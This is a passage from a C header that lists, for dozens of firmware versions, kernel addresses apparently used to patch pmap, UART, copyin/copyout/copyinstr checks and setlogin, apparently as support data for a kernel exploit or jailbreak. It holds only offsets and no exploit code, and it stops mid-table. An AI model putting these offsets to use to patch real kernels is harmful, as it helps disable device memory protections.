#define K407_PMAP_STORE  0x0
#define K450_PMAP_STORE  0x0
#define K455_PMAP_STORE  0x0
#define K470_PMAP_STORE  0x0
#define K471_PMAP_STORE  0x0
#define K472_PMAP_STORE  0x0
#define K473_PMAP_STORE  0x0
#define K474_PMAP_STORE  0x021C5A38
#define K500_PMAP_STORE  0x022CB4F0
#define K501_PMAP_STORE  0x022CB4F0
#define K503_PMAP_STORE  0x022CB570
#define K505_PMAP_STORE  0x022CB570
#define K507_PMAP_STORE  0x022CB570
#define K550_PMAP_STORE  0x022A0BA0
#define K553_PMAP_STORE  0x022A0BA0
#define K555_PMAP_STORE  0x022A4BA0
#define K556_PMAP_STORE  0x021D5638
#define K600_PMAP_STORE  0x021D5638
#define K602_PMAP_STORE  0x021D5638
#define K620_PMAP_STORE  0x021D9638
#define K650_PMAP_STORE  0x01BB7880
#define K651_PMAP_STORE  0x01BB7880
#define K670_PMAP_STORE  0x01BB7880
#define K671_PMAP_STORE  0x01BB7880
#define K672_PMAP_STORE  0x01BB7880
#define K700_PMAP_STORE  0x022C5268
#define K701_PMAP_STORE  0x022C5268
#define K702_PMAP_STORE  0x022C5268
#define K750_PMAP_STORE  0x0215EA40
#define K751_PMAP_STORE  0x0215EA40
#define K755_PMAP_STORE  0x0215EA40
#define K800_PMAP_STORE  0x02245C40
#define K801_PMAP_STORE  0x02245C40
#define K803_PMAP_STORE  0x02245C40
#define K850_PMAP_STORE  0x01BF69B0
#define K852_PMAP_STORE  0x01BF69B0
#define K900_PMAP_STORE  0x01B904B0
#define K903_PMAP_STORE  0x01B8C4B0
#define K904_PMAP_STORE  0x01B8C4B0
#define K950_PMAP_STORE  0x02228E88
#define K951_PMAP_STORE  0x02228E88
#define K960_PMAP_STORE  0x02228E88
#define K1000_PMAP_STORE 0x02182D60
#define K1001_PMAP_STORE 0x02182D60
#define K1050_PMAP_STORE 0x01B2CEE0
#define K1070_PMAP_STORE 0x01B2CEE0
#define K1071_PMAP_STORE 0x01B2CEE0
#define K1100_PMAP_STORE 0x02162A88
#define K1102_PMAP_STORE 0x02162A88
#define K1150_PMAP_STORE 0x01B2C3A0
#define K1152_PMAP_STORE 0x01B2C3A0
#define K1200_PMAP_STORE 0x01B2C3A0
#define K1202_PMAP_STORE 0x01B2C3A0
#define K1250_PMAP_STORE 0x01B2C3A0
#define K1252_PMAP_STORE 0x01B2C3A0

#define K300_UART_PATCH  0x0
#define K310_UART_PATCH  0x0
#define K311_UART_PATCH  0x0
#define K315_UART_PATCH  0x0
#define K350_UART_PATCH  0x0
#define K355_UART_PATCH  0x0
#define K370_UART_PATCH  0x0
#define K400_UART_PATCH  0x0
#define K401_UART_PATCH  0x0
#define K405_UART_PATCH  0x0
#define K406_UART_PATCH  0x0
#define K407_UART_PATCH  0x0
#define K450_UART_PATCH  0x0
#define K455_UART_PATCH  0x0
#define K470_UART_PATCH  0x0
#define K471_UART_PATCH  0x0
#define K472_UART_PATCH  0x0
#define K473_UART_PATCH  0x0
#define K474_UART_PATCH  0x0199FC18
#define K500_UART_PATCH  0x019ECEB0
#define K501_UART_PATCH  0x019ECEB0
#define K503_UART_PATCH  0x019ECEB0
#define K505_UART_PATCH  0x019ECEB0
#define K507_UART_PATCH  0x019ECEB0
#define K550_UART_PATCH  0x01A5FDD0
#define K553_UART_PATCH  0x01A5FDD0
#define K555_UART_PATCH  0x01A63DD0
#define K556_UART_PATCH  0x0156C338
#define K600_UART_PATCH  0x0156C338
#define K602_UART_PATCH  0x0156C338
#define K620_UART_PATCH  0x01570338
#define K650_UART_PATCH  0x01A6EB18
#define K651_UART_PATCH  0x01A6EB18
#define K670_UART_PATCH  0x01A6EB18
#define K671_UART_PATCH  0x01A6EB18
#define K672_UART_PATCH  0x01A6EB18
#define K700_UART_PATCH  0x01A6EAA0
#define K701_UART_PATCH  0x01A6EAA0
#define K702_UART_PATCH  0x01A6EAA0
#define K750_UART_PATCH  0x01564910
#define K751_UART_PATCH  0x01564910
#define K755_UART_PATCH  0x01564910
#define K800_UART_PATCH  0x0155D190
#define K801_UART_PATCH  0x0155D190
#define K803_UART_PATCH  0x0155D190
#define K850_UART_PATCH  0x0153AE88
#define K852_UART_PATCH  0x0153AE88
#define K900_UART_PATCH  0x0152BF60
#define K903_UART_PATCH  0x01527F60
#define K904_UART_PATCH  0x01527F60
#define K950_UART_PATCH  0x01A50BE0
#define K951_UART_PATCH  0x01A50BE0
#define K960_UART_PATCH  0x01A50BE0
#define K1000_UART_PATCH 0x01A78A78
#define K1001_UART_PATCH 0x01A78A78
#define K1050_UART_PATCH 0x01A3BCA0
#define K1070_UART_PATCH 0x01A3BCA0
#define K1071_UART_PATCH 0x01A3BCA0
#define K1100_UART_PATCH 0x0152CFF8
#define K1102_UART_PATCH 0x0152CFF8
#define K1150_UART_PATCH 0x01A47F40
#define K1152_UART_PATCH 0x01A47F40
#define K1200_UART_PATCH 0x01A47F40
#define K1202_UART_PATCH 0x01A47F40
#define K1250_UART_PATCH 0x01A47F40
#define K1252_UART_PATCH 0x01A47F40

#define K300_COPYIN_PATCH_1  0x0
#define K310_COPYIN_PATCH_1  0x0
#define K311_COPYIN_PATCH_1  0x0
#define K315_COPYIN_PATCH_1  0x0
#define K350_COPYIN_PATCH_1  0x0
#define K355_COPYIN_PATCH_1  0x0
#define K370_COPYIN_PATCH_1  0x0
#define K400_COPYIN_PATCH_1  0x0
#define K401_COPYIN_PATCH_1  0x0
#define K405_COPYIN_PATCH_1  0x0
#define K406_COPYIN_PATCH_1  0x0
#define K407_COPYIN_PATCH_1  0x0
#define K450_COPYIN_PATCH_1  0x0
#define K455_COPYIN_PATCH_1  0x0
#define K470_COPYIN_PATCH_1  0x0
#define K471_COPYIN_PATCH_1  0x0
#define K472_COPYIN_PATCH_1  0x0
#define K473_COPYIN_PATCH_1  0x0
#define K474_COPYIN_PATCH_1  0x00149F77
#define K500_COPYIN_PATCH_1  0x001EA657
#define K501_COPYIN_PATCH_1  0x001EA657
#define K503_COPYIN_PATCH_1  0x001EA767
#define K505_COPYIN_PATCH_1  0x001EA767
#define K507_COPYIN_PATCH_1  0x001EA767
#define K550_COPYIN_PATCH_1  0x00405C07
#define K553_COPYIN_PATCH_1  0x00405B07
#define K555_COPYIN_PATCH_1  0x00405EC7
#define K556_COPYIN_PATCH_1  0x00114947
#define K600_COPYIN_PATCH_1  0x00114947
#define K602_COPYIN_PATCH_1  0x00114947
#define K620_COPYIN_PATCH_1  0x00114947
#define K650_COPYIN_PATCH_1  0x003C1447
#define K651_COPYIN_PATCH_1  0x003C1447
#define K670_COPYIN_PATCH_1  0x003C17F7
#define K671_COPYIN_PATCH_1  0x003C17F7
#define K672_COPYIN_PATCH_1  0x003C17F7
#define K700_COPYIN_PATCH_1  0x0002F287
#define K701_COPYIN_PATCH_1  0x0002F287
#define K702_COPYIN_PATCH_1  0x0002F287
#define K750_COPYIN_PATCH_1  0x0028FA47
#define K751_COPYIN_PATCH_1  0x0028FA47
#define K755_COPYIN_PATCH_1  0x0028FA47
#define K800_COPYIN_PATCH_1  0x0025E407
#define K801_COPYIN_PATCH_1  0x0025E407
#define K803_COPYIN_PATCH_1  0x0025E407
#define K850_COPYIN_PATCH_1  0x003A4337
#define K852_COPYIN_PATCH_1  0x003A4337
#define K900_COPYIN_PATCH_1  0x002716F7
#define K903_COPYIN_PATCH_1  0x00271377
#define K904_COPYIN_PATCH_1  0x00271377
#define K950_COPYIN_PATCH_1  0x00201F07
#define K951_COPYIN_PATCH_1  0x00201F07
#define K960_COPYIN_PATCH_1  0x00201F07
#define K1000_COPYIN_PATCH_1 0x00472F67
#define K1001_COPYIN_PATCH_1 0x00472F67
#define K1050_COPYIN_PATCH_1 0x000D75B7
#define K1070_COPYIN_PATCH_1 0x000D75B7
#define K1071_COPYIN_PATCH_1 0x000D75B7
#define K1100_COPYIN_PATCH_1 0x002DE037
#define K1102_COPYIN_PATCH_1 0x002DE057
#define K1150_COPYIN_PATCH_1 0x002BD5E7
#define K1152_COPYIN_PATCH_1 0x002BD5E7
#define K1200_COPYIN_PATCH_1 0x002BD6C7
#define K1202_COPYIN_PATCH_1 0x002BD6C7
#define K1250_COPYIN_PATCH_1 0x002BD707
#define K1252_COPYIN_PATCH_1 0x002BD707

#define K300_COPYIN_PATCH_2  0x0
#define K310_COPYIN_PATCH_2  0x0
#define K311_COPYIN_PATCH_2  0x0
#define K315_COPYIN_PATCH_2  0x0
#define K350_COPYIN_PATCH_2  0x0
#define K355_COPYIN_PATCH_2  0x0
#define K370_COPYIN_PATCH_2  0x0
#define K400_COPYIN_PATCH_2  0xDEADC0DE
#define K401_COPYIN_PATCH_2  0xDEADC0DE
#define K405_COPYIN_PATCH_2  0xDEADC0DE
#define K406_COPYIN_PATCH_2  0xDEADC0DE
#define K407_COPYIN_PATCH_2  0xDEADC0DE
#define K450_COPYIN_PATCH_2  0xDEADC0DE
#define K455_COPYIN_PATCH_2  0xDEADC0DE
#define K470_COPYIN_PATCH_2  0xDEADC0DE
#define K471_COPYIN_PATCH_2  0xDEADC0DE
#define K472_COPYIN_PATCH_2  0xDEADC0DE
#define K473_COPYIN_PATCH_2  0xDEADC0DE
#define K474_COPYIN_PATCH_2  0xDEADC0DE
#define K500_COPYIN_PATCH_2  0xDEADC0DE
#define K501_COPYIN_PATCH_2  0xDEADC0DE
#define K503_COPYIN_PATCH_2  0xDEADC0DE
#define K505_COPYIN_PATCH_2  0xDEADC0DE
#define K507_COPYIN_PATCH_2  0xDEADC0DE
#define K550_COPYIN_PATCH_2  0x00405C13
#define K553_COPYIN_PATCH_2  0x00405B13
#define K555_COPYIN_PATCH_2  0x00405ED3
#define K556_COPYIN_PATCH_2  0x00114953
#define K600_COPYIN_PATCH_2  0x00114953
#define K602_COPYIN_PATCH_2  0x00114953
#define K620_COPYIN_PATCH_2  0x00114953
#define K650_COPYIN_PATCH_2  0x003C1453
#define K651_COPYIN_PATCH_2  0x003C1453
#define K670_COPYIN_PATCH_2  0x003C1803
#define K671_COPYIN_PATCH_2  0x003C1803
#define K672_COPYIN_PATCH_2  0x003C1803
#define K700_COPYIN_PATCH_2  0x0002F293
#define K701_COPYIN_PATCH_2  0x0002F293
#define K702_COPYIN_PATCH_2  0x0002F293
#define K750_COPYIN_PATCH_2  0x0028FA53
#define K751_COPYIN_PATCH_2  0x0028FA53
#define K755_COPYIN_PATCH_2  0x0028FA53
#define K800_COPYIN_PATCH_2  0x0025E413
#define K801_COPYIN_PATCH_2  0x0025E413
#define K803_COPYIN_PATCH_2  0x0025E413
#define K850_COPYIN_PATCH_2  0x003A4343
#define K852_COPYIN_PATCH_2  0x003A4343
#define K900_COPYIN_PATCH_2  0x00271703
#define K903_COPYIN_PATCH_2  0x00271383
#define K904_COPYIN_PATCH_2  0x00271383
#define K950_COPYIN_PATCH_2  0x00201F13
#define K951_COPYIN_PATCH_2  0x00201F13
#define K960_COPYIN_PATCH_2  0x00201F13
#define K1000_COPYIN_PATCH_2 0x00472F73
#define K1001_COPYIN_PATCH_2 0x00472F73
#define K1050_COPYIN_PATCH_2 0x000D75C3
#define K1070_COPYIN_PATCH_2 0x000D75C3
#define K1071_COPYIN_PATCH_2 0x000D75C3
#define K1100_COPYIN_PATCH_2 0x002DE043
#define K1102_COPYIN_PATCH_2 0x002DE063
#define K1150_COPYIN_PATCH_2 0x002BD5F3
#define K1152_COPYIN_PATCH_2 0x002BD5F3
#define K1200_COPYIN_PATCH_2 0x002BD6D3
#define K1202_COPYIN_PATCH_2 0x002BD6D3
#define K1250_COPYIN_PATCH_2 0x002BD713
#define K1252_COPYIN_PATCH_2 0x002BD713

#define K300_COPYOUT_PATCH_1  0x0
#define K310_COPYOUT_PATCH_1  0x0
#define K311_COPYOUT_PATCH_1  0x0
#define K315_COPYOUT_PATCH_1  0x0
#define K350_COPYOUT_PATCH_1  0x0
#define K355_COPYOUT_PATCH_1  0x0
#define K370_COPYOUT_PATCH_1  0x0
#define K400_COPYOUT_PATCH_1  0x0
#define K401_COPYOUT_PATCH_1  0x0
#define K405_COPYOUT_PATCH_1  0x0
#define K406_COPYOUT_PATCH_1  0x0
#define K407_COPYOUT_PATCH_1  0x0
#define K450_COPYOUT_PATCH_1  0x0
#define K455_COPYOUT_PATCH_1  0x0
#define K470_COPYOUT_PATCH_1  0x0
#define K471_COPYOUT_PATCH_1  0x0
#define K472_COPYOUT_PATCH_1  0x0
#define K473_COPYOUT_PATCH_1  0x0
#define K474_COPYOUT_PATCH_1  0x00149E92
#define K500_COPYOUT_PATCH_1  0x001EA572
#define K501_COPYOUT_PATCH_1  0x001EA572
#define K503_COPYOUT_PATCH_1  0x001EA682
#define K505_COPYOUT_PATCH_1  0x001EA682
#define K507_COPYOUT_PATCH_1  0x001EA682
#define K550_COPYOUT_PATCH_1  0x00405B12
#define K553_COPYOUT_PATCH_1  0x00405A12
#define K555_COPYOUT_PATCH_1  0x00405DD2
#define K556_COPYOUT_PATCH_1  0x00114852
#define K600_COPYOUT_PATCH_1  0x00114852
#define K602_COPYOUT_PATCH_1  0x00114852
#define K620_COPYOUT_PATCH_1  0x00114852
#define K650_COPYOUT_PATCH_1  0x003C1352
#define K651_COPYOUT_PATCH_1  0x003C1352
#define K670_COPYOUT_PATCH_1  0x003C1702
#define K671_COPYOUT_PATCH_1  0x003C1702
#define K672_COPYOUT_PATCH_1  0x003C1702
#define K700_COPYOUT_PATCH_1  0x0002F192
#define K701_COPYOUT_PATCH_1  0x0002F192
#define K702_COPYOUT_PATCH_1  0x0002F192
#define K750_COPYOUT_PATCH_1  0x0028F952
#define K751_COPYOUT_PATCH_1  0x0028F952
#define K755_COPYOUT_PATCH_1  0x0028F952
#define K800_COPYOUT_PATCH_1  0x0025E312
#define K801_COPYOUT_PATCH_1  0x0025E312
#define K803_COPYOUT_PATCH_1  0x0025E312
#define K850_COPYOUT_PATCH_1  0x003A4242
#define K852_COPYOUT_PATCH_1  0x003A4242
#define K900_COPYOUT_PATCH_1  0x00271602
#define K903_COPYOUT_PATCH_1  0x00271282
#define K904_COPYOUT_PATCH_1  0x00271282
#define K950_COPYOUT_PATCH_1  0x00201E12
#define K951_COPYOUT_PATCH_1  0x00201E12
#define K960_COPYOUT_PATCH_1  0x00201E12
#define K1000_COPYOUT_PATCH_1 0x00472E72
#define K1001_COPYOUT_PATCH_1 0x00472E72
#define K1050_COPYOUT_PATCH_1 0x000D74C2
#define K1070_COPYOUT_PATCH_1 0x000D74C2
#define K1071_COPYOUT_PATCH_1 0x000D74C2
#define K1100_COPYOUT_PATCH_1 0x002DDF42
#define K1102_COPYOUT_PATCH_1 0x002DDF62
#define K1150_COPYOUT_PATCH_1 0x002BD4F2
#define K1152_COPYOUT_PATCH_1 0x002BD4F2
#define K1200_COPYOUT_PATCH_1 0x002BD5D2
#define K1202_COPYOUT_PATCH_1 0x002BD5D2
#define K1250_COPYOUT_PATCH_1 0x002BD612
#define K1252_COPYOUT_PATCH_1 0x002BD612

#define K300_COPYOUT_PATCH_2  0x0
#define K310_COPYOUT_PATCH_2  0x0
#define K311_COPYOUT_PATCH_2  0x0
#define K315_COPYOUT_PATCH_2  0x0
#define K350_COPYOUT_PATCH_2  0x0
#define K355_COPYOUT_PATCH_2  0x0
#define K370_COPYOUT_PATCH_2  0x0
#define K400_COPYOUT_PATCH_2  0xDEADC0DE
#define K401_COPYOUT_PATCH_2  0xDEADC0DE
#define K405_COPYOUT_PATCH_2  0xDEADC0DE
#define K406_COPYOUT_PATCH_2  0xDEADC0DE
#define K407_COPYOUT_PATCH_2  0xDEADC0DE
#define K450_COPYOUT_PATCH_2  0xDEADC0DE
#define K455_COPYOUT_PATCH_2  0xDEADC0DE
#define K470_COPYOUT_PATCH_2  0xDEADC0DE
#define K471_COPYOUT_PATCH_2  0xDEADC0DE
#define K472_COPYOUT_PATCH_2  0xDEADC0DE
#define K473_COPYOUT_PATCH_2  0xDEADC0DE
#define K474_COPYOUT_PATCH_2  0xDEADC0DE
#define K500_COPYOUT_PATCH_2  0xDEADC0DE
#define K501_COPYOUT_PATCH_2  0xDEADC0DE
#define K503_COPYOUT_PATCH_2  0xDEADC0DE
#define K505_COPYOUT_PATCH_2  0xDEADC0DE
#define K507_COPYOUT_PATCH_2  0xDEADC0DE
#define K550_COPYOUT_PATCH_2  0x00405B1E
#define K553_COPYOUT_PATCH_2  0x00405A1E
#define K555_COPYOUT_PATCH_2  0x00405DDE
#define K556_COPYOUT_PATCH_2  0x0011485E
#define K600_COPYOUT_PATCH_2  0x0011485E
#define K602_COPYOUT_PATCH_2  0x0011485E
#define K620_COPYOUT_PATCH_2  0x0011485E
#define K650_COPYOUT_PATCH_2  0x003C135E
#define K651_COPYOUT_PATCH_2  0x003C135E
#define K670_COPYOUT_PATCH_2  0x003C170E
#define K671_COPYOUT_PATCH_2  0x003C170E
#define K672_COPYOUT_PATCH_2  0x003C170E
#define K700_COPYOUT_PATCH_2  0x0002F19E
#define K701_COPYOUT_PATCH_2  0x0002F19E
#define K702_COPYOUT_PATCH_2  0x0002F19E
#define K750_COPYOUT_PATCH_2  0x0028F95E
#define K751_COPYOUT_PATCH_2  0x0028F95E
#define K755_COPYOUT_PATCH_2  0x0028F95E
#define K800_COPYOUT_PATCH_2  0x0025E31E
#define K801_COPYOUT_PATCH_2  0x0025E31E
#define K803_COPYOUT_PATCH_2  0x0025E31E
#define K850_COPYOUT_PATCH_2  0x003A424E
#define K852_COPYOUT_PATCH_2  0x003A424E
#define K900_COPYOUT_PATCH_2  0x0027160E
#define K903_COPYOUT_PATCH_2  0x0027128E
#define K904_COPYOUT_PATCH_2  0x0027128E
#define K950_COPYOUT_PATCH_2  0x00201E1E
#define K951_COPYOUT_PATCH_2  0x00201E1E
#define K960_COPYOUT_PATCH_2  0x00201E1E
#define K1000_COPYOUT_PATCH_2 0x00472E7E
#define K1001_COPYOUT_PATCH_2 0x00472E7E
#define K1050_COPYOUT_PATCH_2 0x000D74CE
#define K1070_COPYOUT_PATCH_2 0x000D74CE
#define K1071_COPYOUT_PATCH_2 0x000D74CE
#define K1100_COPYOUT_PATCH_2 0x002DDF4E
#define K1102_COPYOUT_PATCH_2 0x002DDF6E
#define K1150_COPYOUT_PATCH_2 0x002BD4FE
#define K1152_COPYOUT_PATCH_2 0x002BD4FE
#define K1200_COPYOUT_PATCH_2 0x002BD5DE
#define K1202_COPYOUT_PATCH_2 0x002BD5DE
#define K1250_COPYOUT_PATCH_2 0x002BD61E
#define K1252_COPYOUT_PATCH_2 0x002BD61E

#define K300_COPYINSTR_PATCH_1  0x0
#define K310_COPYINSTR_PATCH_1  0x0
#define K311_COPYINSTR_PATCH_1  0x0
#define K315_COPYINSTR_PATCH_1  0x0
#define K350_COPYINSTR_PATCH_1  0x0
#define K355_COPYINSTR_PATCH_1  0x0
#define K370_COPYINSTR_PATCH_1  0x0
#define K400_COPYINSTR_PATCH_1  0x0
#define K401_COPYINSTR_PATCH_1  0x0
#define K405_COPYINSTR_PATCH_1  0x0
#define K406_COPYINSTR_PATCH_1  0x0
#define K407_COPYINSTR_PATCH_1  0x0
#define K450_COPYINSTR_PATCH_1  0x0
#define K455_COPYINSTR_PATCH_1  0x0
#define K470_COPYINSTR_PATCH_1  0x0
#define K471_COPYINSTR_PATCH_1  0x0
#define K472_COPYINSTR_PATCH_1  0x0
#define K473_COPYINSTR_PATCH_1  0x0
#define K474_COPYINSTR_PATCH_1  0x0014A3E3
#define K500_COPYINSTR_PATCH_1  0x001EAA83
#define K501_COPYINSTR_PATCH_1  0x001EAA83
#define K503_COPYINSTR_PATCH_1  0x001EAB93
#define K505_COPYINSTR_PATCH_1  0x001EAB93
#define K507_COPYINSTR_PATCH_1  0x001EAB93
#define K550_COPYINSTR_PATCH_1  0x004060B3
#define K553_COPYINSTR_PATCH_1  0x00405FB3
#define K555_COPYINSTR_PATCH_1  0x00406373
#define K556_COPYINSTR_PATCH_1  0x00114DF3
#define K600_COPYINSTR_PATCH_1  0x00114DF3
#define K602_COPYINSTR_PATCH_1  0x00114DF3
#define K620_COPYINSTR_PATCH_1  0x00114DF3
#define K650_COPYINSTR_PATCH_1  0x003C18F3
#define K651_COPYINSTR_PATCH_1  0x003C18F3
#define K670_COPYINSTR_PATCH_1  0x003C1CA3
#define K671_COPYINSTR_PATCH_1  0x003C1CA3
#define K672_COPYINSTR_PATCH_1  0x003C1CA3
#define K700_COPYINSTR_PATCH_1  0x0002F733
#define K701_COPYINSTR_PATCH_1  0x0002F733
#define K702_COPYINSTR_PATCH_1  0x0002F733
#define K750_COPYINSTR_PATCH_1  0x0028FEF3
#define K751_COPYINSTR_PATCH_1  0x0028FEF3
#define K755_COPYINSTR_PATCH_1  0x0028FEF3
#define K800_COPYINSTR_PATCH_1  0x0025E8B3
#define K801_COPYINSTR_PATCH_1  0x0025E8B3
#define K803_COPYINSTR_PATCH_1  0x0025E8B3
#define K850_COPYINSTR_PATCH_1  0x003A47E3
#define K852_COPYINSTR_PATCH_1  0x003A47E3
#define K900_COPYINSTR_PATCH_1  0x00271BA3
#define K903_COPYINSTR_PATCH_1  0x00271823
#define K904_COPYINSTR_PATCH_1  0x00271823
#define K950_COPYINSTR_PATCH_1  0x002023B3
#define K951_COPYINSTR_PATCH_1  0x002023B3
#define K960_COPYINSTR_PATCH_1  0x002023B3
#define K1000_COPYINSTR_PATCH_1 0x00473413
#define K1001_COPYINSTR_PATCH_1 0x00473413
#define K1050_COPYINSTR_PATCH_1 0x000D7A63
#define K1070_COPYINSTR_PATCH_1 0x000D7A63
#define K1071_COPYINSTR_PATCH_1 0x000D7A63
#define K1100_COPYINSTR_PATCH_1 0x002DE4E3
#define K1102_COPYINSTR_PATCH_1 0x002DE503
#define K1150_COPYINSTR_PATCH_1 0x002BDA93
#define K1152_COPYINSTR_PATCH_1 0x002BDA93
#define K1200_COPYINSTR_PATCH_1 0x002BDB73
#define K1202_COPYINSTR_PATCH_1 0x002BDB73
#define K1250_COPYINSTR_PATCH_1 0x002BDBB3
#define K1252_COPYINSTR_PATCH_1 0x002BDBB3

#define K300_COPYINSTR_PATCH_2  0x0
#define K310_COPYINSTR_PATCH_2  0x0
#define K311_COPYINSTR_PATCH_2  0x0
#define K315_COPYINSTR_PATCH_2  0x0
#define K350_COPYINSTR_PATCH_2  0x0
#define K355_COPYINSTR_PATCH_2  0x0
#define K370_COPYINSTR_PATCH_2  0x0
#define K400_COPYINSTR_PATCH_2  0xDEADC0DE
#define K401_COPYINSTR_PATCH_2  0xDEADC0DE
#define K405_COPYINSTR_PATCH_2  0xDEADC0DE
#define K406_COPYINSTR_PATCH_2  0xDEADC0DE
#define K407_COPYINSTR_PATCH_2  0xDEADC0DE
#define K450_COPYINSTR_PATCH_2  0xDEADC0DE
#define K455_COPYINSTR_PATCH_2  0xDEADC0DE
#define K470_COPYINSTR_PATCH_2  0xDEADC0DE
#define K471_COPYINSTR_PATCH_2  0xDEADC0DE
#define K472_COPYINSTR_PATCH_2  0xDEADC0DE
#define K473_COPYINSTR_PATCH_2  0xDEADC0DE
#define K474_COPYINSTR_PATCH_2  0xDEADC0DE
#define K500_COPYINSTR_PATCH_2  0xDEADC0DE
#define K501_COPYINSTR_PATCH_2  0xDEADC0DE
#define K503_COPYINSTR_PATCH_2  0xDEADC0DE
#define K505_COPYINSTR_PATCH_2  0xDEADC0DE
#define K507_COPYINSTR_PATCH_2  0xDEADC0DE
#define K550_COPYINSTR_PATCH_2  0x004060BF
#define K553_COPYINSTR_PATCH_2  0x00405FBF
#define K555_COPYINSTR_PATCH_2  0x0040637F
#define K556_COPYINSTR_PATCH_2  0x00114DFF
#define K600_COPYINSTR_PATCH_2  0x00114DFF
#define K602_COPYINSTR_PATCH_2  0x00114DFF
#define K620_COPYINSTR_PATCH_2  0x00114DFF
#define K650_COPYINSTR_PATCH_2  0x003C18FF
#define K651_COPYINSTR_PATCH_2  0x003C18FF
#define K670_COPYINSTR_PATCH_2  0x003C1CAF
#define K671_COPYINSTR_PATCH_2  0x003C1CAF
#define K672_COPYINSTR_PATCH_2  0x003C1CAF
#define K700_COPYINSTR_PATCH_2  0x0002F73F
#define K701_COPYINSTR_PATCH_2  0x0002F73F
#define K702_COPYINSTR_PATCH_2  0x0002F73F
#define K750_COPYINSTR_PATCH_2  0x0028FEFF
#define K751_COPYINSTR_PATCH_2  0x0028FEFF
#define K755_COPYINSTR_PATCH_2  0x0028FEFF
#define K800_COPYINSTR_PATCH_2  0x0025E8BF
#define K801_COPYINSTR_PATCH_2  0x0025E8BF
#define K803_COPYINSTR_PATCH_2  0x0025E8BF
#define K850_COPYINSTR_PATCH_2  0x003A47EF
#define K852_COPYINSTR_PATCH_2  0x003A47EF
#define K900_COPYINSTR_PATCH_2  0x00271BAF
#define K903_COPYINSTR_PATCH_2  0x0027182F
#define K904_COPYINSTR_PATCH_2  0x0027182F
#define K950_COPYINSTR_PATCH_2  0x002023BF
#define K951_COPYINSTR_PATCH_2  0x002023BF
#define K960_COPYINSTR_PATCH_2  0x002023BF
#define K1000_COPYINSTR_PATCH_2 0x0047341F
#define K1001_COPYINSTR_PATCH_2 0x0047341F
#define K1050_COPYINSTR_PATCH_2 0x000D7A6F
#define K1070_COPYINSTR_PATCH_2 0x000D7A6F
#define K1071_COPYINSTR_PATCH_2 0x000D7A6F
#define K1100_COPYINSTR_PATCH_2 0x002DE4EF
#define K1102_COPYINSTR_PATCH_2 0x002DE50F
#define K1150_COPYINSTR_PATCH_2 0x002BDA9F
#define K1152_COPYINSTR_PATCH_2 0x002BDA9F
#define K1200_COPYINSTR_PATCH_2 0x002BDB7F
#define K1202_COPYINSTR_PATCH_2 0x002BDB7F
#define K1250_COPYINSTR_PATCH_2 0x002BDBBF
#define K1252_COPYINSTR_PATCH_2 0x002BDBBF

#define K300_COPYINSTR_PATCH_3  0x0
#define K310_COPYINSTR_PATCH_3  0x0
#define K311_COPYINSTR_PATCH_3  0x0
#define K315_COPYINSTR_PATCH_3  0x0
#define K350_COPYINSTR_PATCH_3  0x0
#define K355_COPYINSTR_PATCH_3  0x0
#define K370_COPYINSTR_PATCH_3  0x0
#define K400_COPYINSTR_PATCH_3  0x0
#define K401_COPYINSTR_PATCH_3  0x0
#define K405_COPYINSTR_PATCH_3  0x0
#define K406_COPYINSTR_PATCH_3  0x0
#define K407_COPYINSTR_PATCH_3  0x0
#define K450_COPYINSTR_PATCH_3  0x0
#define K455_COPYINSTR_PATCH_3  0x0
#define K470_COPYINSTR_PATCH_3  0x0
#define K471_COPYINSTR_PATCH_3  0x0
#define K472_COPYINSTR_PATCH_3  0x0
#define K473_COPYINSTR_PATCH_3  0x0
#define K474_COPYINSTR_PATCH_3  0x0014A413
#define K500_COPYINSTR_PATCH_3  0x001EAAB3
#define K501_COPYINSTR_PATCH_3  0x001EAAB3
#define K503_COPYINSTR_PATCH_3  0x001EABC3
#define K505_COPYINSTR_PATCH_3  0x001EABC3
#define K507_COPYINSTR_PATCH_3  0x001EABC3
#define K550_COPYINSTR_PATCH_3  0x004060F0
#define K553_COPYINSTR_PATCH_3  0x00405FF0
#define K555_COPYINSTR_PATCH_3  0x004063B0
#define K556_COPYINSTR_PATCH_3  0x00114E30
#define K600_COPYINSTR_PATCH_3  0x00114E30
#define K602_COPYINSTR_PATCH_3  0x00114E30
#define K620_COPYINSTR_PATCH_3  0x00114E30
#define K650_COPYINSTR_PATCH_3  0x003C1930
#define K651_COPYINSTR_PATCH_3  0x003C1930
#define K670_COPYINSTR_PATCH_3  0x003C1CE0
#define K671_COPYINSTR_PATCH_3  0x003C1CE0
#define K672_COPYINSTR_PATCH_3  0x003C1CE0
#define K700_COPYINSTR_PATCH_3  0x0002F770
#define K701_COPYINSTR_PATCH_3  0x0002F770
#define K702_COPYINSTR_PATCH_3  0x0002F770
#define K750_COPYINSTR_PATCH_3  0x0028FF30
#define K751_COPYINSTR_PATCH_3  0x0028FF30
#define K755_COPYINSTR_PATCH_3  0x0028FF30
#define K800_COPYINSTR_PATCH_3  0x0025E8F0
#define K801_COPYINSTR_PATCH_3  0x0025E8F0
#define K803_COPYINSTR_PATCH_3  0x0025E8F0
#define K850_COPYINSTR_PATCH_3  0x003A4820
#define K852_COPYINSTR_PATCH_3  0x003A4820
#define K900_COPYINSTR_PATCH_3  0x00271BE0
#define K903_COPYINSTR_PATCH_3  0x00271860
#define K904_COPYINSTR_PATCH_3  0x00271860
#define K950_COPYINSTR_PATCH_3  0x002023F0
#define K951_COPYINSTR_PATCH_3  0x002023F0
#define K960_COPYINSTR_PATCH_3  0x002023F0
#define K1000_COPYINSTR_PATCH_3 0x00473450
#define K1001_COPYINSTR_PATCH_3 0x00473450
#define K1050_COPYINSTR_PATCH_3 0x000D7AA0
#define K1070_COPYINSTR_PATCH_3 0x000D7AA0
#define K1071_COPYINSTR_PATCH_3 0x000D7AA0
#define K1100_COPYINSTR_PATCH_3 0x002DE520
#define K1102_COPYINSTR_PATCH_3 0x002DE540
#define K1150_COPYINSTR_PATCH_3 0x002BDAD0
#define K1152_COPYINSTR_PATCH_3 0x002BDAD0
#define K1200_COPYINSTR_PATCH_3 0x002BDBB0
#define K1202_COPYINSTR_PATCH_3 0x002BDBB0
#define K1250_COPYINSTR_PATCH_3 0x002BDBF0
#define K1252_COPYINSTR_PATCH_3 0x002BDBF0

#define K300_SETLOGIN_PATCH  0x0
#define K310_SETLOGIN_PATCH  0x0
#define K311_SETLOGIN_PATCH  0x0
#define K315_SETLOGIN_PATCH  0x0
#define K350_SETLOGIN_PATCH  0x0
#define K355_SETLOGIN_PATCH  0x0
#define K370_SETLOGIN_PATCH  0x0
#define K400_SETLOGIN_PATCH  0x0
#define K401_SETLOGIN_PATCH  0x0
